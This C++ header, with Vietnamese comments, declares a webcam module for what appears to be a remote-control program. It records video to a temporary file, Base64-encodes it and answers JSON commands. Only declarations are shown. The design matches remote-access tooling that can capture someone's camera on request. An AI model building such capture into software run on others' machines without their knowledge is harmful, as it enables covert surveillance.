#pragma once
#include "../interfaces/IRemoteModule.hpp"
#include <string>
#include <vector>

class WebcamManager : public IRemoteModule {
private:
    std::string module_name_ = "WEBCAM";

    // Hàm nội bộ: Quay video và lưu vào đường dẫn tạm
    // Trả về true nếu thành công
    bool record_video_file(const std::wstring& filepath, int duration_sec);

    // Hàm nội bộ: Đọc file và mã hóa Base64
    std::string read_file_as_base64(const std::wstring& filepath);

    // Hàm helper Base64 (riêng tư cho module này)
    std::string base64_encode(const std::vector<uint8_t>& data);

public:
    WebcamManager() = default;
    ~WebcamManager() override = default;

    // Implement IRemoteModule
    const std::string& get_module_name() const override { return module_name_; }
    json handle_command(const json& request) override;
};